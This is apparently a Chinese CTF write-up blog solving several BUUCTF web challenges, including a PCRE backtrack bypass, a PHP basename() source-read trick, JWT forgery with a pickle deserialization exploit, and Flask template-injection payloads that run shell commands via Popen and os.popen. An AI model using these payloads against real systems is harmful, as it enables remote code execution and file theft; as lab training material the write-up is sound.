<p><img src="https://img-blog.csdnimg.cn/2020120321290851.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3JmcmRlcg==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;&#123;%0A&quot;cmd&quot;:&quot;ls &#x2F;home&#x2F;rceservice&quot;%0A&#125;</span><br></pre></td></tr></table></figure>



<p>但发现无法直接cat flag</p>
<p>查看可以利用的命令</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;&#123;%0A&quot;cmd&quot;:&quot;ls &#x2F;bin&quot;%0A&#125;</span><br><span class="line">Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bash bunzip2 bzcat bzcmp bzdiff bzegrep bzexe bzfgrep bzgrep bzip2 bzip2recover bzless bzmore cat chgrp chmod chown cp dash date dd df dir dmesg dnsdomainname domainname echo egrep false fgrep findmnt grep gunzip gzexe gzip hostname kill ln login ls lsblk mkdir mknod mktemp more mount mountpoint mv nisdomainname pidof ps pwd rbash readlink rm rmdir run-parts sed sh sleep stty su sync tar tempfile touch true umount uname uncompress vdir wdctl which ypdomainname zcat zcmp zdiff zegrep zfgrep zforce zgrep zless zmore znew </span><br></pre></td></tr></table></figure>

<h3 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h3><p>回溯绕过</p>
<p>学习链接</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;www.leavesongs.com&#x2F;PENETRATION&#x2F;use-pcre-backtrack-limit-to-bypass-restrict.html</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url &#x3D; &#39;http:&#x2F;&#x2F;3857bebb-30dc-4ea9-a07c-b07502b8df92.node4.buuoj.cn:81&#x2F;&#39;</span><br><span class="line">data &#x3D; &#123;</span><br><span class="line">    &#39;cmd&#39;: &#39;&#123;&quot;cmd&quot;:&quot;&#x2F;bin&#x2F;cat &#x2F;home&#x2F;rceservice&#x2F;flag&quot;,&quot;xxy&quot;:&quot;&#39;+&#39;a&#39;*1000000+&#39;&quot;&#125;&#39;</span><br><span class="line">&#125;</span><br><span class="line">r &#x3D; requests.post(url&#x3D;url, data&#x3D;data).text</span><br><span class="line">print(r)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="TIPS-2"><a href="#TIPS-2" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">putenv(&#39;PATH&#x3D;&#x2F;home&#x2F;rceservice&#x2F;jail&#39;);</span><br><span class="line">设置了环境变量的PATH，导致不能使用相对路径，只能用绝对路径：</span><br><span class="line">Linux命令的位置：&#x2F;bin,&#x2F;usr&#x2F;bin，默认都是全体用户使用，&#x2F;sbin,&#x2F;usr&#x2F;sbin,默认root用户使用</span><br></pre></td></tr></table></figure>

<h2 id="Zer0pts2020-Can-you"><a href="#Zer0pts2020-Can-you" class="headerlink" title="[Zer0pts2020]Can you"></a>[Zer0pts2020]Can you</h2><p>题目有个source按钮给源码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"> &lt;?php</span><br><span class="line">include &#39;config.php&#39;; &#x2F;&#x2F; FLAG is defined in config.php</span><br><span class="line"></span><br><span class="line">if (preg_match(&#39;&#x2F;config\.php\&#x2F;*$&#x2F;i&#39;, $_SERVER[&#39;PHP_SELF&#39;])) &#123;</span><br><span class="line">  exit(&quot;I don&#39;t know what you are thinking, but I won&#39;t let you read it :)&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$secret &#x3D; bin2hex(random_bytes(64));</span><br><span class="line">if (isset($_POST[&#39;guess&#39;])) &#123;</span><br><span class="line">  $guess &#x3D; (string) $_POST[&#39;guess&#39;];</span><br><span class="line">  if (hash_equals($secret, $guess)) &#123;</span><br><span class="line">    $message &#x3D; &#39;Congratulations! The flag is: &#39; . FLAG;</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    $message &#x3D; &#39;Wrong.&#39;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line">&lt;!doctype html&gt;</span><br><span class="line">&lt;html lang&#x3D;&quot;en&quot;&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;utf-8&quot;&gt;</span><br><span class="line">    &lt;title&gt;Can you guess it?&lt;&#x2F;title&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;h1&gt;Can you guess it?&lt;&#x2F;h1&gt;</span><br><span class="line">    &lt;p&gt;If your guess is correct, I&#39;ll give you the flag.&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;p&gt;&lt;a href&#x3D;&quot;?source&quot;&gt;Source&lt;&#x2F;a&gt;&lt;&#x2F;p&gt;</span><br><span class="line">    &lt;hr&gt;</span><br><span class="line">&lt;?php if (isset($message)) &#123; ?&gt;</span><br><span class="line">    &lt;p&gt;&lt;?&#x3D; $message ?&gt;&lt;&#x2F;p&gt;</span><br><span class="line">&lt;?php &#125; ?&gt;</span><br><span class="line">    &lt;form action&#x3D;&quot;index.php&quot; method&#x3D;&quot;POST&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;text&quot; name&#x3D;&quot;guess&quot;&gt;</span><br><span class="line">      &lt;input type&#x3D;&quot;submit&quot;&gt;</span><br><span class="line">    &lt;&#x2F;form&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt; </span><br></pre></td></tr></table></figure>

<p>if (hash_equals($secret, $guess)) 最后的结果是需要两个便利的hash相同，即可获得flag</p>
<p>guess是我们传入的值并进行 $guess = (string) $_POST[‘guess’];强制转化</p>
<p>secret是$secret = bin2hex(random_bytes(64));随机值</p>
<p>但这样看来获取的难度很大</p>
<p>但是还存在一个内容，存在就有意义，highlight_file也是可以读取文件的，那么我们接下来就要看看什么是basename和$_SERVER[‘PHP_SELF’])</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (isset($_GET[&#39;source&#39;])) &#123;</span><br><span class="line">  highlight_file(basename($_SERVER[&#39;PHP_SELF&#39;]));</span><br><span class="line">  exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>根据basename的特性</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">那么此时$_SERVER[&#39;PHP_SELF&#39;] 的值就是&#x2F;index.php&#x2F;config.php&#x2F;</span><br><span class="line"></span><br><span class="line">basename($_SERVER[&#39;PHP_SELF&#39;]) 就是config.php</span><br><span class="line"></span><br><span class="line">然后再highlight_file ，就可以读取到config.php的文件内容了。</span><br></pre></td></tr></table></figure>

<p>此时只需要绕过prem_match就可以了根据basename去掉不可见字符的特性来完成绕过</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;index.php&#x2F;config.php&#x2F;xff?source&#x3D;</span><br></pre></td></tr></table></figure>



<h3 id="TIPS-3"><a href="#TIPS-3" class="headerlink" title="TIPS"></a>TIPS</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">$_SERVER[‘PHP_SELF’]表示当前执行脚本的文件名，当使用了PATH_INFO时，这个值是可控的。所以可以尝试用&#x2F;index.php&#x2F;config.php?source来读取flag。</span><br><span class="line"></span><br><span class="line">basename()函数的一个问题，它会去掉文件名开头的非ASCII值：</span><br><span class="line">var_dump(basename(&quot;xffconfig.php&quot;)); &#x2F;&#x2F; &#x3D;&gt; config.php</span><br><span class="line">var_dump(basename(&quot;config.php&#x2F;xff&quot;)); &#x2F;&#x2F; &#x3D;&gt; config.php</span><br><span class="line"></span><br><span class="line">&lt;?php</span><br><span class="line">$path &#x3D; &quot;&#x2F;testweb&#x2F;home.php&quot;;</span><br><span class="line">&#x2F;&#x2F;显示带有文件扩展名的文件名</span><br><span class="line">echo basename($path);			&#x2F;&#x2F;home.php</span><br><span class="line">&#x2F;&#x2F;显示不带有文件扩展名的文件名</span><br><span class="line">echo basename($path,&quot;.php&quot;);	&#x2F;&#x2F;home</span><br><span class="line">?&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="CISCN2019-华北赛区-Day1-Web2-ikun"><a href="#CISCN2019-华北赛区-Day1-Web2-ikun" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web2]ikun"></a>[CISCN2019 华北赛区 Day1 Web2]ikun</h2><p>发现问题提示买到lv6，但下面出现的最多lv5</p>
<p>登录、注册、找回密码功能</p>
<p>注册后回显空白但注册成功</p>


<p>抓包看看，购买界面抓包</p>


<p>随便买了一个lv5，在购物车中结算</p>




<p>发现可以直接抓包修改价格和折扣，那是不是只要找到lv6就可以直接修改购买</p>
<p>当一回脚本小子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import requests</span><br><span class="line">url &#x3D; &quot;http:&#x2F;&#x2F;6bbacb79-646c-41d4-a49a-7e9bcf5da7b6.node4.buuoj.cn:81&#x2F;shop?page&#x3D;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(0, 2000):</span><br><span class="line">    print(i)</span><br><span class="line">    r &#x3D; requests.get(url + str(i))</span><br><span class="line">    if &#39;lv6.png&#39; in r.text:</span><br><span class="line">        print(i)</span><br><span class="line">        break</span><br><span class="line">最后结果在181页</span><br></pre></td></tr></table></figure>

<p>修改折扣购买</p>


<p>发现给了个路由</p>
<p>/b1g_m4mber，进去显示只有admin可以显示</p>
<p>修改密码抓包，发现JWT字样，Python题目加上jwt，那是不是jwt伪造</p>


<p>JWT伪造</p>


<p>修改用户名为admin，并且输入Key1Kun,进入新页面F12大法审计</p>


<p>发现源码路由</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">根据其他师傅的文章，代码审计后漏洞点在admin.py</span><br><span class="line"></span><br><span class="line">    @tornado.web.authenticated</span><br><span class="line">    def post(self, *args, **kwargs):</span><br><span class="line">        try:</span><br><span class="line">            become &#x3D; self.get_argument(&#39;become&#39;)</span><br><span class="line">            p &#x3D; pickle.loads(urllib.unquote(become))</span><br><span class="line">            return self.render(&#39;form.html&#39;, res&#x3D;p, member&#x3D;1)</span><br><span class="line">        except:</span><br><span class="line">            return self.render(&#39;form.html&#39;, res&#x3D;&#39;This is Black Technology!&#39;, member&#x3D;0)</span><br></pre></td></tr></table></figure>

<p>先读懂代码逻辑</p>
<p>对于become这个参数类型</p>
<p> p = pickle.loads(urllib.unquote(become))</p>
<p>其中有两个操作</p>
<p>unquote</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urllib.unquote:将存入的字典参数编码为URL查询字符串，即转换成以key1 &#x3D; value1 &amp; key2 &#x3D; value2的形式</span><br></pre></td></tr></table></figure>

<p>pickle.loads(bytes_object)</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">从字节对象中读取被封装的对象，并返回我看了师傅们的博客之后的理解就是，我们构建一个类，类里面的__reduce__python魔术方法会在该类被反序列化的时候会被调用Pickle模块中最常用的函数为：</span><br></pre></td></tr></table></figure>

<p>那么我们可以利用loads的读取</p>
<p>那么就是加密解密一样，类似序列化，我们先将内容dumps然后再quote这样在web端运行时就会解开并运行__reduce__中的代码了</p>
<p>EXP</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">       return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))    #打开读取flag.txt的内容</span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())  #序列化payload</span><br><span class="line">a &#x3D; urllib.quote(a)  #进行url编码</span><br><span class="line">print a</span><br><span class="line"></span><br><span class="line">c__builtin__%0Aeval%0Ap0%0A%28S%22open%28%27&#x2F;flag.txt%27%2C%27r%27%29.read%28%29%22%0Ap1%0Atp2%0ARp3%0A.</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">但这个环境是python2的，py3跑出来有点问题</span><br><span class="line">import pickle</span><br><span class="line">import urllib</span><br><span class="line"></span><br><span class="line">from urllib import parse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class payload(object):</span><br><span class="line">    def __reduce__(self):</span><br><span class="line">        return (eval, (&quot;open(&#39;&#x2F;flag.txt&#39;,&#39;r&#39;).read()&quot;,))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">a &#x3D; pickle.dumps(payload())</span><br><span class="line">a &#x3D; urllib.parse.quote(a)</span><br><span class="line">print(a)</span><br></pre></td></tr></table></figure>





<h3 id="TIPS-4"><a href="#TIPS-4" class="headerlink" title="TIPS"></a>TIPS</h3><h4 id="JWT伪造"><a href="#JWT伪造" class="headerlink" title="JWT伪造"></a>JWT伪造</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">认识JWT</span><br><span class="line">https:&#x2F;&#x2F;www.cnblogs.com&#x2F;cjsblog&#x2F;p&#x2F;9277677.html</span><br><span class="line"></span><br><span class="line">JWT伪造在线网站</span><br><span class="line">https:&#x2F;&#x2F;jwt.io&#x2F;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h4 id="Python审计"><a href="#Python审计" class="headerlink" title="Python审计"></a>Python审计</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。</span><br></pre></td></tr></table></figure>

<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p>进来没啥信息先F12大法</p>


<p>发现一个可控参数search</p>
<p>因为是F提示是lask框架，那么通过search来找利用类，测试发现存在模板注入，但4*4不报错，4+4报错，可能存在过滤</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">寻找执行命可以借助的类</span><br><span class="line">        a. 获取变量[]所属的类名 &#123;&#123;[].__class__&#125;&#125;</span><br><span class="line">        页面回显 &lt;type &#39;list&#39;&gt;</span><br><span class="line">        b. 获取list所继承的基类名 &#123;&#123;[].__class__.__base__&#125;&#125;</span><br><span class="line">        页面回显 &lt;type &#39;object&#39;&gt;</span><br><span class="line">        c. 获取所有继承自object的类 &#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br><span class="line">        这里回显了很长一个列表，这里可以将这些数据放在列表中，通过list.index输出想要的类在第几位。不过需要对这传数据进行简单的处理（将&lt;&gt;换成&quot;&quot;）再用换行替换,就可以得到他们的索引值    </span><br></pre></td></tr></table></figure>

<p>这里也可以利用脚本来完成查询</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">.__class__.__mro__[2].__subclasses__()</span><br><span class="line">可以爆出所有类</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import re</span><br><span class="line">import html</span><br><span class="line">import time</span><br><span class="line"></span><br><span class="line">index &#x3D; 0</span><br><span class="line">for i in range(0, 1000):</span><br><span class="line">    try:</span><br><span class="line">        url &#x3D; &quot;http:&#x2F;&#x2F;975f7b62-04bd-4c9a-bdcd-84bb2cac2593.node4.buuoj.cn:81&#x2F;?search&#x3D;&#123;&#123;&#39;&#39;.__class__.__mro__[2].__subclasses__()[&quot; + str(</span><br><span class="line">            i) + &quot;]&#125;&#125;&quot;</span><br><span class="line">        r &#x3D; requests.get(url)</span><br><span class="line">        res &#x3D; re.findall(</span><br><span class="line">            &quot;&lt;h2&gt;You searched for:&lt;\&#x2F;h2&gt;\W+&lt;h3&gt;(.*)&lt;\&#x2F;h3&gt;&quot;, r.text)</span><br><span class="line">        time.sleep(0.1)</span><br><span class="line">        # print(res)</span><br><span class="line">        # print(r.text)</span><br><span class="line">        res &#x3D; html.unescape(res[0])</span><br><span class="line">        print(str(i) + &quot; | &quot; + res)</span><br><span class="line">        if &quot;subprocess.Popen&quot; in res:</span><br><span class="line">            index &#x3D; i</span><br><span class="line">            break</span><br><span class="line">    except:</span><br><span class="line">        continue</span><br><span class="line">print(&quot;indexo of subprocess.Popen:&quot; + str(index))</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>查看危险类</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Popen</span><br></pre></td></tr></table></figure>



<h3 id="TIPS-5"><a href="#TIPS-5" class="headerlink" title="TIPS"></a>TIPS</h3><p>subprocess.popen用法</p>
<p>首先如果直接常规使用，发现回显是一传看不懂的</p>


<p>然后就去学了下别人的方法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()[258](&quot;ls&quot;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;;</span><br></pre></td></tr></table></figure>



<p>回显成功，但不知道目录在哪里可以利用</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看配置项目的信息</span><br><span class="line">?search&#x3D;&#123;&#123;config.items()&#125;&#125;;</span><br></pre></td></tr></table></figure>



<p>发现flag，但好像还是不知道位置</p>
<p>测试最后找到</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">search&#x3D;&#123;&#123;[].__class__.__base__.__subclasses__()[258](&quot;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek&quot;,shell&#x3D;True,stdout&#x3D;-1).communicate()[0].strip()&#125;&#125;;</span><br></pre></td></tr></table></figure>

<p>其他解法</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">内含os模块的类 class&#39;site._Printer&#39;</span><br><span class="line">    a. 目录查询</span><br><span class="line">     &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls&#39;).read()&#125;&#125;</span><br><span class="line">     因为这里listdir同样被ban了</span><br><span class="line">   b.  读取目录flasklight</span><br><span class="line">     &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;ls &#x2F;flasklight&#39;).read()&#125;&#125;</span><br><span class="line">    c. 读取flag</span><br><span class="line">     &#123;&#123;[].__class__.__base__.__subclasses__()[71].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;os&#39;].popen(&#39;cat coomme_geeeett_youur_flek&#39;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">不含os模块的类warnings.catch_warnings</span><br><span class="line"></span><br><span class="line">　　进行命令执行</span><br><span class="line">       a. 目录读取</span><br><span class="line">       &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls&#39;).read()&quot;)&#125;&#125;</span><br><span class="line">       PS：由于使用[&#39;__globals__&#39;]会造成500的服务器错误信息，并且当我直接输入search&#x3D;globals时页面也会500，觉得这里应该是被过滤了，所以这里采用了字符串拼接的形式[&#39;__glo&#39;+&#39;bals__&#39;]</span><br><span class="line">       页面回显：bin boot dev etc flasklight home lib lib64 media mnt opt proc root run sbin srv sys tmp usr var</span><br><span class="line">       b. 读取目录flasklight</span><br><span class="line">       &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;ls &#x2F;flasklight&#39;).read()&quot;)&#125;&#125;</span><br><span class="line">       页面回显：app.py coomme_geeeett_youur_flek</span><br><span class="line">       c. cat文件 coomme_geeeett_youur_flek 得到flag</span><br><span class="line">       &#123;&#123;[].__class__.__base__.__subclasses__()[59].__init__[&#39;__glo&#39;+&#39;bals__&#39;][&#39;__builtins__&#39;][&#39;eval&#39;](&quot;__import__(&#39;os&#39;).popen(&#39;cat &#x2F;flasklight&#x2F;coomme_geeeett_youur_flek &#39;).read()&quot;)&#125;&#125;   </span><br></pre></td></tr></table></figure>



<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>F12大法发现check.php</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">AKsujvCn1G</span><br><span class="line">&lt;?php</span><br><span class="line">#这不是抽奖程序的源代码！不许看！</span><br><span class="line">header(&quot;Content-Type: text&#x2F;html;charset&#x3D;utf-8&quot;);</span><br><span class="line">session_start();</span><br><span class="line">if(!isset($_SESSION[&#39;seed&#39;]))&#123;</span><br><span class="line">$_SESSION[&#39;seed&#39;]&#x3D;rand(0,999999999);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">mt_srand($_SESSION[&#39;seed&#39;]);</span><br><span class="line">$str_long1 &#x3D; &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str&#x3D;&#39;&#39;;</span><br><span class="line">$len1&#x3D;20;</span><br><span class="line">for ( $i &#x3D; 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.&#x3D;substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show &#x3D; substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id&#x3D;&#39;p1&#39;&gt;&quot;.$str_show.&quot;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">if(isset($_POST[&#39;num&#39;]))&#123;</span><br><span class="line">    if($_POST[&#39;num&#39;]&#x3D;&#x3D;&#x3D;$str)&#123;x</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">        echo &quot;&lt;p id&#x3D;flag&gt;没抽中哦，再试试吧&lt;&#x2F;p&gt;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">show_source(&quot;check.php&quot;); </span><br></pre></td></tr></table></figure>

<p>这里的mr_rand存在漏洞，可以爆破出随机数种子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> mt_rand</span><br><span class="line"> 参考链接</span><br><span class="line"> https:&#x2F;&#x2F;www.freebuf.com&#x2F;vuls&#x2F;192012.html</span><br></pre></td></tr></table></figure>

<p>利用工具    </p>
